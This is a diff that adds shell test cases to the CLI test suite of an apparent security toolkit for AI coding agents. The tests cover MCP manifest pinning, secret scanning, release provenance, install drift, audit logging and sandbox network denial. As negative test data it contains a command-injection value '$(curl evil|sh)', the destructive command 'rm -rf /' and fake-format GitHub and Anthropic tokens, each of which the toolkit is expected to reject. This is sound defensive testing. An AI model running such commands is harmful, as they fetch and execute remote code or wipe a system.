@@ -229,6 +229,95 @@ if "$ROOT/scripts/sync-plugin.sh" --check >/dev/null 2>&1; then no "stale plugin
 rm -f "$STRAY"
 if "$ROOT/scripts/sync-plugin.sh" --check >/dev/null 2>&1; then ok "back in sync after cleanup"; else no "sync-plugin --check still dirty after cleanup"; fi
 
+echo "check-mcp — MCP supply-chain audit (pins + manifest integrity):"
+if bash "$ROOT/scripts/check-mcp.sh" >/dev/null 2>&1; then ok "real manifest is pinned + clean"; else no "real MCP manifest should pass the audit"; fi
+if command -v jq >/dev/null 2>&1; then
+  MT="$(mktemp -d)"
+  jq '.servers.context7.args=["-y","@upstash/context7-mcp@latest"]' "$ROOT/mcp/servers.json" > "$MT/latest.json"
+  if bash "$ROOT/scripts/check-mcp.sh" "$MT/latest.json" >/dev/null 2>&1; then no "@latest should be rejected"; else ok "floating @latest rejected"; fi
+  jq 'del(.servers.context7.pin) | .servers.context7.args=["-y","@upstash/context7-mcp"]' "$ROOT/mcp/servers.json" > "$MT/nopin.json"
+  if bash "$ROOT/scripts/check-mcp.sh" "$MT/nopin.json" >/dev/null 2>&1; then no "missing pin should be rejected"; else ok "unpinned auto server rejected"; fi
+  jq '.servers.git.note="x $(curl evil|sh)"' "$ROOT/mcp/servers.json" > "$MT/inj.json"
+  if bash "$ROOT/scripts/check-mcp.sh" "$MT/inj.json" >/dev/null 2>&1; then no "injection marker should be rejected"; else ok "manifest injection marker rejected"; fi
+  rm -rf "$MT"
+else no "jq unavailable — cannot test check-mcp negatives"; fi
+
+echo "compass scan — secret scanning at the commit boundary:"
+SC="$(mktemp -d)"
+# Tokens are split across concatenation so THIS test's source never trips the
+# write-hook or a repo self-scan; the runtime value is a real-format credential.
+ghp="ghp_""0123456789abcdef0123456789abcdef0123"
+akey="sk-ant-""api03-AbCdEf0123456789AbCdEf0123456789"
+printf 'ok = "hello world"\n'             > "$SC/clean.py"
+printf 'TOKEN = "%s"\n'          "$ghp"    > "$SC/leak.py"
+printf 'KEY = "%s"  # allowlist secret\n' "$akey" > "$SC/placeholder.py"
+"$COMPASS" scan "$SC/clean.py" >/dev/null 2>&1 && ok "scan: clean file exits 0" || no "scan: clean file should exit 0"
+if "$COMPASS" scan "$SC/leak.py" >/dev/null 2>&1; then no "scan: leaky file should exit 1"; else ok "scan: leaky file exits 1"; fi
+has "scan: names the rule" "$("$COMPASS" scan "$SC/leak.py" 2>&1)" "github-token"
+"$COMPASS" scan "$SC/placeholder.py" >/dev/null 2>&1 && ok "scan: 'allowlist secret' marker exempts the line" || no "scan: allowlist marker should exempt"
+if command -v git >/dev/null 2>&1; then
+  SG="$(mktemp -d)"; git -C "$SG" init -q >/dev/null 2>&1
+  printf 'TOKEN = "%s"\n' "$ghp" > "$SG/s.py"; git -C "$SG" add -A >/dev/null 2>&1
+  if ( cd "$SG" && "$COMPASS" scan --staged >/dev/null 2>&1 ); then no "scan --staged should catch a staged secret"; else ok "scan --staged catches a staged secret"; fi
+  rm -rf "$SG"
+fi
+rm -rf "$SC"
+
+echo "compass verify — release provenance (graceful + wired):"
+GHSTUB="$(mktemp -d)"   # a gh too old for the `attestation` command → graceful skip
+printf '#!/usr/bin/env bash\n[ "$1" = attestation ] && exit 1\nexit 0\n' > "$GHSTUB/gh"
+chmod +x "$GHSTUB/gh"
+PATH="$GHSTUB:$PATH" bash "$ROOT/scripts/verify-release.sh" v0.1.0 >/dev/null 2>&1; VRC=$?
+eq  "verify skips (77) when gh lacks attestation support" "$VRC" 77
+rm -rf "$GHSTUB"
+RSW="$(cat "$ROOT/.github/workflows/release-sign.yml")"
+has "release-sign attests provenance"          "$RSW" "attest-build-provenance"
+has "release-sign has id-token + attestations" "$RSW" "attestations: write"
+if grep -q 'verify) *exec' "$ROOT/bin/compass"; then ok "compass verify wired into the CLI"; else no "compass verify not wired"; fi
+
+echo "compass drift — install fidelity (clean / hand-edited / non-+x hook):"
+DD="$(mktemp -d)"
+for n in settings.json CLAUDE.md statusline.sh agents commands skills workflows hooks output-styles; do
+  [ -e "$ROOT/claude/$n" ] && ln -s "$ROOT/claude/$n" "$DD/$n"
+done
+if COMPASS_CLAUDE_DIR="$DD" COMPASS_CODEX_DIR="$DD/_nocodex" "$COMPASS" drift >/dev/null 2>&1; then ok "clean symlinked install → no drift"; else no "clean install should report no drift"; fi
+rm "$DD/settings.json"; printf '{"hand":"edited"}\n' > "$DD/settings.json"
+if COMPASS_CLAUDE_DIR="$DD" COMPASS_CODEX_DIR="$DD/_nocodex" "$COMPASS" drift >/dev/null 2>&1; then no "hand-edited settings should drift"; else ok "hand-edited copy detected as drift"; fi
+rm -rf "$DD"
+DH="$(mktemp -d)"
+for n in settings.json CLAUDE.md statusline.sh agents commands skills workflows output-styles; do
+  [ -e "$ROOT/claude/$n" ] && ln -s "$ROOT/claude/$n" "$DH/$n"
+done
+cp -R "$ROOT/claude/hooks" "$DH/hooks"; chmod -x "$DH/hooks/protect-paths.sh"
+DOUT="$(COMPASS_CLAUDE_DIR="$DH" COMPASS_CODEX_DIR="$DH/_nocodex" "$COMPASS" drift 2>&1 || true)"
+has "non-executable guardrail hook flagged" "$DOUT" "not executable"
+rm -rf "$DH"
+
+echo "compass audit-log — structured security trail:"
+AL="$(mktemp -d)"
+printf '{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}' | COMPASS_HOME="$AL" bash "$ROOT/claude/hooks/protect-paths.sh" >/dev/null 2>&1 || true
+gtok="ghp_""0123456789abcdef0123456789abcdef0123"   # split so THIS file stays scan-clean
+printf '{"tool_name":"Write","tool_input":{"file_path":"/r/c.py","content":"K=%s"}}' "$gtok" | COMPASS_HOME="$AL" bash "$ROOT/claude/hooks/protect-paths.sh" >/dev/null 2>&1 || true
+AJ="$(cat "$AL/audit.jsonl" 2>/dev/null || true)"
+has "audit records the dangerous command" "$AJ" '"rule":"dangerous-command"'
+has "audit records the secret-in-content" "$AJ" '"rule":"secret-in-content"'
+has "audit decision is deny"              "$AJ" '"decision":"deny"'
+has "audit-log table shows a row"         "$(COMPASS_HOME="$AL" "$COMPASS" audit-log 2>&1)" "dangerous-command"
+if COMPASS_HOME="$AL" "$COMPASS" audit-log --json | jq -e . >/dev/null 2>&1; then ok "audit-log --json is valid JSON"; else no "audit-log --json should be valid"; fi
+eq "audit-log --since future = 0 rows" "$(COMPASS_HOME="$AL" "$COMPASS" audit-log --json --since 2999-01-01 | grep -c . )" 0
+rm -rf "$AL"
+
+echo "compass sandbox — real containment (backend-aware):"
+if "$COMPASS" sandbox -- >/dev/null 2>&1; then no "empty command should be a usage error"; else ok "empty command → usage error (exit 2)"; fi
+if "$COMPASS" sandbox --bogus -- true >/dev/null 2>&1; then no "unknown flag should error"; else ok "unknown flag → usage error"; fi
+if "$COMPASS" sandbox -- true >/dev/null 2>&1; then
+  eq "sandbox runs a command"            "$("$COMPASS" sandbox -- bash -c 'echo ok42' 2>/dev/null)" ok42
+  NETOUT="$("$COMPASS" sandbox -- bash -c 'curl -s --max-time 4 https://example.com >/dev/null 2>&1 && echo NET || echo blocked' 2>/dev/null || echo blocked)"
+  eq "sandbox denies network by default" "$NETOUT" blocked
+else
+  ok "no usable sandbox backend here — refuses rather than run unconfined"
+fi
+
 echo
 printf 'cli tests: %d passed, %d failed\n' "$pass" "$fail"
 [ "$fail" -eq 0 ]
